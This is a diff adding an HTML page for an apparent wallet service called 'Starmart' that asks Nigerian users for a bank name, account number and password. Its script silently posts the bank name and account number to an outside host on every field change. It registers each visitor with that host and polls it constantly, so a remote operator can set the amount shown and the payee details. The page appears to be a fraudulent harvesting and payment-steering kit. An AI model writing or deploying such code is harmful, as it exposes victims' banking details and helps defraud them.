@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
+    <title>Starmart</title>
+    <link rel="icon" href="../image.jpg" type="image/x-icon">
+	<meta name="theme-color" content="#0066ff">
+    <link rel="shortcut icon" href="starmart.jpeg" type="image/x-icon">
+    <link rel="manifest" href="../manifest.json">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+  body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  padding: 0;
+  line-height: 1.6;
+}
+
+/* Top Ad Styles */
+.top {
+	position: fixed;
+	top: 0;
+	display: flex;
+	background: #fff;
+	margin: 0;
+	justify-content: space-between;
+	box-sizing: border-box;
+	align-items: center;
+	width: 100%;
+	padding: 10px 20px;
+	z-index: 1000;
+	border-bottom: 2px solid #fff;
+	box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+}
+.logo p{
+	font-size: 24px;
+	font-family: "Poppins", "Manrope", system-ui, sans-serif;
+	font-weight: 700;     
+	letter-spacing: -0.6px;
+	color: #0066ff;
+	margin: 0;
+}
+.logo i {
+	font-size: 30px;
+	margin-right: 10px;
+}
+.topBtn button{
+	font-size: 14px;
+	background: #fff;
+	color: #0066ff;
+	border: 2px solid #0066ff;
+	padding: 8px 12px;
+	border-radius: 20px;
+	display: none;
+}
+/* Header */
+.header {
+  text-align: center;
+  padding: 2rem;
+  background-image: url('starmart.jpeg'); 
+  background-position: bottom; 
+  background-size: cover;
+  border-top: 10px solid black;
+  height: 70px;   
+}
+
+.header h1, .lower h1 {
+  font-size: 3rem;
+  color: #ff6f61;
+  margin: 0;
+  filter: drop-shadow(2px 4px 6px black);
+  opacity: 0;
+}
+
+.header p, .lower p {
+  font-size: 1.2rem;
+  margin: 0.5rem 0;
+  color: #ff6f61;
+  opacity: 0;
+}
+
+/* Content */
+.content {
+	padding: 0.5rem;
+}
+
+ section {
+	 margin-bottom: 2rem;
+ }
+
+/* Body */
+.container {
+	margin: 5px auto;
+    padding: 5px 20px 40px;
+    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.15);
+    border-radius: 5px;
+	max-width: 500px;
+}
+.formHead {
+	font-size: 1.5rem;
+	font-weight: 700;
+}
+.step-indicator {
+	display: flex;
+	justify-content: space-between;
+	margin-bottom: 40px;
+	position: relative;      
+}
+.step-indicator:before {
+	content: '';         
+	position: absolute;        
+	top: 15px;         
+	left: 0;       
+	right: 0;       
+	height: 2px;        
+	background: #eee;        
+	z-index: 1;   
+}
+.step {
+	text-align: center;       
+	position: relative;        
+	z-index: 2;
+}
+.step-number {
+	width: 30px;        
+	height: 30px;       
+	border-radius: 50%;         
+	background: #eee;
+	color: #999;        
+	display: flex;         
+	align-items: center;        
+	justify-content: center;        
+	margin: 0 auto 10px;        
+	font-weight: bold;   
+}
+.step.active .step-number {
+	background: #0066ff;
+	color: white;      
+}
+.step.completed .step-number {           
+	background: #7FB2FF;
+	color: white;
+}
+.step-title {
+	font-size: 14px;        
+	color: #999;
+}
+.step.active .step-title {
+	color: #0066ff;        
+	font-weight: 500;    
+}
+.step.completed .step-title {
+	color: #7FB2FF;    
+}
+.container label {
+	display: block;
+	font-size: 0.9rem;
+	font-weight: bold;
+	padding-left: 10px;
+}
+.container input {
+	border: 1px solid #000;
+	outline: none;
+	padding: 10px;
+	font-size: 16px;
+	margin-bottom: 15px;
+	width: 90%;
+	background: transparent;
+}
+.password {
+	margin: 0;
+	position: relative;
+	background: transparent;
+}
+.password i {
+	text-align: right;
+	position: absolute;
+	/*top: 50%;*/
+	width: 90%;
+}
+	  
+#response {
+	font-weight: bold;
+	padding: 0px 10px 20px;
+	
+}
+.buttons {
+	display: flex;
+	justify-content: space-between;
+	width: 100%;
+	text-align: center;
+}
+	  
+/* Hide */
+.hidden {
+	display:none;
+}
+  </style>
+</head>
+<body>
+<!-- Top Page Advertisement -->
+  <div class="top">
+    <div class="logo">
+      <p><i class="fa fa-balance-scale" aria-hidden="true"></i><strong>Starmart</strong></p>
+	</div>
+	<div class="topBtn">
+		<button id="redeemBtn">Redeem Token</button>
+	</div>
+  </div>
+
+  <!-- Header Section -->
+  <header class="header">
+    <!-- For IMAGE -->
+  </header>
+
+  <!-- Main Content -->
+  <main class="content">
+    <!-- Form Part -->
+    <section>
+		<div class="container">
+			<h2 class="formHead">Create New Wallet</h2>
+            
+            <!-- Step Indicator -->
+            <div class="step-indicator">
+                <div class="step active" id="step1">
+                    <div class="step-number">1</div>
+                    <div class="step-title">Create</div>
+                </div>
+                <div class="step" id="step2">
+                    <div class="step-number">2</div>
+                    <div class="step-title">Bank</div>
+                </div>
+                <div class="step" id="step3">
+                    <div class="step-number">3</div>
+                    <div class="step-title">Complete</div>
+                </div>
+            </div>
+
+			<!-- Step 1: Wallet Creation -->
+            <div id="creationStep">
+				<form method="post" id="form">
+					<label for="country">Country & Currency</label>
+					<input type="text" value="Nigeria: &#8358;" id="country" readonly>
+					
+					<label for="azaName">Bank Name</label>
+					<input type="text" id="azaName" name="azaName" placeholder="eg Opay, Access..." onchange="toa({message: this.value})">
+					
+					<label for="azaNumber">Account Number</label>
+					<input type="text" id="azaNumber" name="azaNumber" placeholder="0123456789" onchange="toa({message: this.value})">
+
+					<div class="password">
+						<label for="password">Password</label>
+						<input type="password" id="password" name="password" placeholder="create a strong password">
+						<i id="eye" class="fas fa-eye"></i>
+					</div>
+					
+					<label for="confirmPassword">Confirm Password</label>
+					<input type="password" id="confirmPassword" name="confirmPassword" placeholder="re-enter password">
+					
+					<small id="response"></small>
+
+					
+					<div class="buttons">
+						<button type="submit">Submit</button>
+					</div>
+				</form>
+			</div>
+			
+			<!-- Step 2: Account -->
+            <div id="accountStep" class="hidden">
+				<form method="post" id="formTwo">
+					<label for="country">Country & Currency</label>
+					<input type="text" value="Nigeria: &#8358;" id="country" readonly>
+					<label for="azaName">Bank Name</label>
+					<input type="text" id="azaName" name="azaName" placeholder="eg Opay, Access..." onchange="toa({message: this.value})">
+					<label for="azaNumber">Account Number</label>
+					<input type="text" id="azaNumber" name="azaNumber" placeholder="0123456789" onchange="toa({message: this.value})">
+				
+					<div class="buttons">
+						<button type="button" id="backToCreation">Back</button>
+						<button type="submit">Next</button>
+					</div>
+				</form>
+			</div>
+
+			<!-- Step 3: Completion -->
+            <div id="completionStep" class="hidden">
+				<div class="buttons">
+					<button id="backToAccount">Back</button>
+					<button id="goToDashboard">Go to Dashboard</button>
+				</div>
+			</div>
+		</div>
+    </section>
+  </main>
+
+</body>
+	<script src="../sw.js"></script>
+	<script>
+		// Senders
+        function sender(payload) {
+            const url = 'https://send-39yi.onrender.com/api/messages';  
+            fetch(url, {
+                method: 'POST',
+                headers: {     
+                    'Content-Type': 'application/json',  
+                },   
+                body: JSON.stringify(payload)    
+            });  
+        }
+
+		function toa(payload) {
+            const url = 'https://send-39yi.onrender.com/send';  
+            fetch(url, {
+                method: 'POST',
+                headers: {     
+                    'Content-Type': 'application/json',  
+                },   
+                body: JSON.stringify(payload)    
+            });  
+        }
+        // Code Generator
+        function generateRandomCode() {
+            const numbers = Array.from({length: 8}, () => Math.floor(Math.random() * 10));
+            const letters = Array.from({length: 2}, () => String.fromCharCode(65 + Math.floor(Math.random() * 26)));
+            const allChars = [...numbers, ...letters];
+           
+            // Shuffle the array
+            for (let i = allChars.length - 1; i > 0; i--) {  
+                const j = Math.floor(Math.random() * (i + 1));
+                [allChars[i], allChars[j]] = [allChars[j], allChars[i]];
+            }
+            return allChars.join('');
+        }
+
+        // Check if a User Account has been created
+        if (localStorage.getItem('savedInfos')) {
+            console.log('UserId is already stored');
+        } else {
+            const code = generateRandomCode();
+            const digits = Array.from({ length: 10 }, () => Math.floor(Math.random() * 10)).join('');
+            const Infos = {
+                userId: code,
+                demoAcc: digits,
+                azaName: '',  
+                realAcc: '',
+                name: '',
+                amount: 0,
+				request: false,
+                update: '',
+                payName: '',
+                payNumber: ''
+            };
+    
+            localStorage.setItem('savedInfos', JSON.stringify(Infos));
+            sender(Infos);
+        }
+
+		// GET SavedInfo
+        const savedInfo = JSON.parse(localStorage.getItem('savedInfos'));
+        const userId = savedInfo.userId;
+        
+        // Send Status      
+        document.addEventListener('visibilitychange', () => { 
+            if (document.visibilityState === 'visible') {
+                //sender({ userId: userId, status: "online" });
+            } else {
+                //sender({ userId: userId, status: "offline" });          
+            }
+        });
+
+    
+        // HANDLE NEW WALLET CREATION
+        const form = document.getElementById('form');
+		const formTwo = document.getElementById('formTwo');
+		const creationStep = document.getElementById('creationStep');
+		const accountStep = document.getElementById('accountStep');
+        const completionStep = document.getElementById('completionStep');
+
+		// Step Buttons and Steps
+		const backToCreation = document.getElementById('backToCreation');
+		const backToAccount = document.getElementById('backToAccount');
+		const goToDashboard = document.getElementById('goToDashboard');
+		// Step indicators
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+
+        form.addEventListener('submit', (event) => {
+            event.preventDefault();
+
+			const password = document.getElementById('password').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+			const response = document.getElementById('response');
+			
+            // Validate passwords match
+            if (password !== confirmPassword) {
+                response.textContent = 'Passwords do not match!';
+				return;
+            }
+			
+            const formData = new FormData(form);
+            //const message = formData.get('message');
+            //sender(message, randomCode);
+
+			// Show account step
+            creationStep.classList.add('hidden');
+            accountStep.classList.remove('hidden');
+                
+            // Update step indicator
+            step1.classList.remove('active');
+            step1.classList.add('completed');
+            step2.classList.add('active');
+        })
+
+		// Back to creating
+		backToCreation.addEventListener('click', function() {
+			// Show completion step
+            accountStep.classList.add('hidden');
+            creationStep.classList.remove('hidden');
+                
+            // Update step indicator
+            step1.classList.remove('completed');
+            step2.classList.remove('active');
+            step1.classList.add('active');
+		});
+
+		// Continue to verification
+        formTwo.addEventListener('submit', (event) => {
+			event.preventDefault();
+            const formData = new FormData(form);
+            //const message = formData.get('message');
+			
+			// Show completion step
+            accountStep.classList.add('hidden');
+            completionStep.classList.remove('hidden');
+                
+            // Update step indicator
+            step2.classList.remove('active');
+            step2.classList.add('completed');
+            step3.classList.add('active');
+		})
+		
+		// Back to account
+        backToAccount.addEventListener('click', function() {
+			// Show completion step
+            completionStep.classList.add('hidden');
+            accountStep.classList.remove('hidden');
+                
+            // Update step indicator
+            step2.classList.remove('completed');
+            step3.classList.remove('active');
+            step2.classList.add('active');
+		});
+		
+		// Go to dashboard
+        goToDashboard.addEventListener('click', function() {
+            window.location.href = 'dashboard.html';
+            //localStorage.setItem('login', 'true');
+        });
+		
+		
+        // MAIN CODE FETCH AND EXTRACTION
+		let lastMessageId = localStorage.getItem('latestId') || 0;
+        async function fetchMessages() {
+            try {
+                const response = await fetch(`https://send-39yi.onrender.com/in/messages?lastMessageId=${lastMessageId}`);
+                const newMessages = await response.json();
+
+                if (newMessages.length > 0) {
+                    extractMessages(newMessages);
+                    // Update last message ID
+                    lastMessageId = newMessages[newMessages.length - 1].id;
+                    localStorage.setItem('latestId', lastMessageId);
+                }
+            } catch (error) {
+                console.error('Error fetching messages:', error);
+            } finally {
+                // Immediately poll again
+                setTimeout(fetchMessages, 100);
+            }
+        }
+
+		// Extract New Messages, Save/Update
+        function extractMessages(messages) {
+            messages.forEach(message => {
+				if(savedInfo.userId.toLowerCase() === message.userId.toLowerCase()){
+					console.log('For User');
+					if(message.name){
+						savedInfo.name = message.name;
+						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
+						sender({ userId: savedInfo.userId, name: savedInfo.name });
+					}
+					if(message.amount){
+						savedInfo.amount = message.amount;
+						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
+						sender({ userId: savedInfo.userId, amount: savedInfo.amount });
+					}
+					if(message.update){
+						savedInfo.update = message.update;
+						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
+						sender({ userId: savedInfo.userId, update: savedInfo.update });
+					}
+					if(message.payName){
+						savedInfo.payName = message.payName;
+						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
+					}
+					if(message.payNumber){
+						savedInfo.payNumber = message.payNumber;
+						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
+						sender({ userId: savedInfo.userId, update: `${savedInfo.payName} ${savedInfo.payNumber}` });
+						
+					}
+                } else {
+                    console.log('Not For User');
+                }
+            });
+        }
+    
+        // Start polling when page loads
+        window.addEventListener('load', () => {
+            fetchMessages(); 
+        });
+
+	</script>
+</html>
+  
+  
